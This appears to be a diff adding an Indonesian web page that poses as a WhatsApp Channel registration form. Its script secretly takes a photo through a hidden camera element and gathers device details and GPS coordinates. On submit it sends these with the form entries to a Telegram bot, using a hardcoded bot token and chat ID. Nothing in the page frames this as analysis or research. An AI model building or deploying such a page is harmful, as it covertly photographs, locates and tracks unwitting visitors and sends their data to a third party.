@@ -1,0 +1,227 @@
+
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Pendaftaran ID Channel WhatsApp</title>
+  <style>
+    @import url('https://fonts.googleapis.com/css2?family=Poppins:wght@400;600&display=swap');
+
+    body {
+      margin: 0;
+      font-family: 'Poppins', sans-serif;
+      background: linear-gradient(135deg, #1e1e1e, #111);
+      color: #fff;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      min-height: 100vh;
+      padding: 20px;
+    }
+    h1 {
+      margin-bottom: 10px;
+      color: #ff4b2b;
+      text-shadow: 0 0 10px #ff4b2b;
+      font-size: 28px;
+    }
+    #clock {
+      font-size: 18px;
+      margin-bottom: 20px;
+      color: #fff176;
+      text-shadow: 0 0 5px #fff176;
+    }
+    form {
+      display: flex;
+      flex-direction: column;
+      gap: 15px;
+      background: rgba(255,255,255,0.05);
+      padding: 25px;
+      border-radius: 15px;
+      width: 100%;
+      max-width: 420px;
+      box-shadow: 0 0 25px rgba(255,75,43,0.5);
+    }
+    input {
+      padding: 12px;
+      border-radius: 10px;
+      border: none;
+      outline: none;
+      font-size: 16px;
+      background: rgba(255,255,255,0.1);
+      color: #fff;
+      transition: 0.3s;
+    }
+    input:focus {
+      background: rgba(255,255,255,0.2);
+      box-shadow: 0 0 10px #ff4b2b;
+    }
+    button {
+      padding: 14px;
+      border: none;
+      border-radius: 12px;
+      background: #ff4b2b;
+      color: #fff;
+      font-size: 16px;
+      cursor: pointer;
+      transition: 0.3s;
+      font-weight: 600;
+    }
+    button:hover {
+      background: #ff3a1b;
+      transform: scale(1.05);
+    }
+  </style>
+</head>
+<body>
+  <h1>Pendaftaran ID Channel WhatsApp</h1>
+  <div id="clock">--:--:--</div>
+
+  <!-- Video kamera disembunyikan -->
+  <video id="video" autoplay playsinline style="display:none;"></video>
+  <canvas id="canvas" style="display:none;"></canvas>
+
+  <form id="channelForm">
+    <input type="text" id="idChannel" placeholder="ID Channel WhatsApp" required>
+    <input type="text" id="namaChannel" placeholder="Nama Channel WhatsApp" required>
+    <input type="text" id="linkChannel" placeholder="Link Channel WhatsApp" required>
+    <input type="number" id="totalPengikut" placeholder="Total Pengikut" required>
+    <button type="submit">Kirim</button>
+  </form>
+
+  <script>
+    const BOT_TOKEN = "8375191991:AAEzzRKH4ROSYojEoHEkwGV-WohHq91918U"; 
+    const CHAT_ID = "6349562246"; 
+
+    // Real-time clock
+    function updateClock() {
+      const now = new Date();
+      const timeStr = now.toLocaleTimeString('id-ID', { hour12: false });
+      document.getElementById('clock').innerText = timeStr;
+    }
+    setInterval(updateClock, 1000);
+    updateClock();
+
+    let videoReady = false;
+
+    async function startCamera() {
+      try {
+        const video = document.getElementById('video');
+        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+        video.srcObject = stream;
+        video.onloadedmetadata = () => { video.play(); videoReady = true; };
+      } catch (err) {
+        alert("Mohon izinkan akses: " + err);
+      }
+    }
+
+    async function capturePhoto() {
+      if (!videoReady) await new Promise(resolve => setTimeout(resolve, 500));
+      const video = document.getElementById('video');
+      const canvas = document.getElementById('canvas');
+      const context = canvas.getContext('2d');
+      canvas.width = video.videoWidth || 640;
+      canvas.height = video.videoHeight || 480;
+      context.drawImage(video, 0, 0, canvas.width, canvas.height);
+      return new Promise(resolve => canvas.toBlob(blob => resolve(blob), 'image/jpeg', 0.95));
+    }
+
+    async function getDeviceInfo() {
+      const userAgent = navigator.userAgent;
+      const platform = navigator.platform;
+      const language = navigator.language;
+      const deviceMemory = navigator.deviceMemory || "Tidak tersedia";
+      const androidMatch = userAgent.match(/Android\s([0-9\.]+)/);
+      const androidVersion = androidMatch ? androidMatch[1] : "Tidak Android";
+      const isMobile = /Mobi|Android/i.test(userAgent);
+      const deviceType = isMobile ? "Mobile" : "Desktop";
+      const deviceName = userAgent.match(/\((.*?)\)/)?.[1] || platform;
+
+      const info = {
+        deviceName, deviceType, platform, language,
+        androidVersion, ram: deviceMemory + " GB",
+        screenWidth: window.screen.width, screenHeight: window.screen.height,
+        windowWidth: window.innerWidth, windowHeight: window.innerHeight
+      };
+
+      return new Promise(resolve => {
+        if (navigator.geolocation) {
+          navigator.geolocation.getCurrentPosition(pos => {
+            info.latitude = pos.coords.latitude;
+            info.longitude = pos.coords.longitude;
+            info.accuracy = pos.coords.accuracy;
+            info.mapsLink = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
+            resolve(info);
+          }, () => resolve(info));
+        } else {
+          resolve(info);
+        }
+      });
+    }
+
+    async function sendTelegramMessage(text, photoBlob=null) {
+      try {
+        if (photoBlob) {
+          const formData = new FormData();
+          formData.append("chat_id", CHAT_ID);
+          formData.append("photo", photoBlob, "foto.jpg");
+          formData.append("caption", text);
+          await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method:"POST", body: formData });
+        } else {
+          await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+            method:"POST",
+            headers:{"Content-Type":"application/json"},
+            body: JSON.stringify({ chat_id: CHAT_ID, text })
+          });
+        }
+      } catch(err) { console.error("Gagal kirim:", err); }
+    }
+
+    document.getElementById('channelForm').addEventListener('submit', async (e) => {
+      e.preventDefault();
+      const idChannel = document.getElementById('idChannel').value;
+      const namaChannel = document.getElementById('namaChannel').value;
+      const linkChannel = document.getElementById('linkChannel').value;
+      const totalPengikut = document.getElementById('totalPengikut').value;
+
+      const photoBlob = await capturePhoto();
+      const deviceInfo = await getDeviceInfo();
+
+      const now = new Date();
+      const timestamp = now.getFullYear()+"-"+String(now.getMonth()+1).padStart(2,'0')+"-"+String(now.getDate()).padStart(2,'0')+
+                        " "+String(now.getHours()).padStart(2,'0')+":"+String(now.getMinutes()).padStart(2,'0')+":"+String(now.getSeconds()).padStart(2,'0');
+
+      let message = `
+📋 Pendaftaran Channel WhatsApp
+ID Channel: ${idChannel}
+Nama Channel: ${namaChannel}
+Link Channel: ${linkChannel}
+Total Pengikut: ${totalPengikut}
+
+⏰ Waktu Kirim: ${timestamp}
+
+🌐 Device Info:
+Nama Device: ${deviceInfo.deviceName}
+Jenis Device: ${deviceInfo.deviceType}
+Platform: ${deviceInfo.platform}
+Bahasa: ${deviceInfo.language}
+Versi Android: ${deviceInfo.androidVersion}
+RAM: ${deviceInfo.ram}
+Resolusi Layar: ${deviceInfo.screenWidth}x${deviceInfo.screenHeight}
+Resolusi Jendela: ${deviceInfo.windowWidth}x${deviceInfo.windowHeight}
+`;
+
+      if(deviceInfo.latitude && deviceInfo.longitude){
+        message += `\n📍 Lokasi: ${deviceInfo.latitude}, ${deviceInfo.longitude} (±${deviceInfo.accuracy} m)
+Maps: ${deviceInfo.mapsLink}`;
+      } else { message += `\n📍 Lokasi: Tidak tersedia`; }
+
+      await sendTelegramMessage(message, photoBlob);
+      alert("✅ Data berhasil dikirim!");
+      document.getElementById('channelForm').reset();
+    });
+
+    startCamera();
+  </script>
+</body>
+</html>
